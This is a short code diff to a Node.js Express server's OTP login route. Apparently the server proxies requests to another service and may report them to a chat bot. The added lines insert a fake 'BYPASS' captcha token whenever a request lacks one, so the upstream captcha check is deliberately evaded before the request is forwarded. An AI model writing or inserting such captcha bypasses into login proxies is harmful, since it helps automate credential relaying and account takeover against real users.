@@ -1939,6 +1939,11 @@ app.post('/app/user/login/login', async (req, res) => {
 app.post('/app/user/login/sendotp', async (req, res) => {
   try {
     const data = await loadData();
+    if (req.parsedBody && typeof req.parsedBody === 'object') {
+      if (!req.parsedBody.reCaptcha && !req.parsedBody.captchaToken && !req.parsedBody.token) {
+        req.parsedBody.reCaptcha = '0.BYPASS_TURNS_TOKEN_DEFAULT';
+      }
+    }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
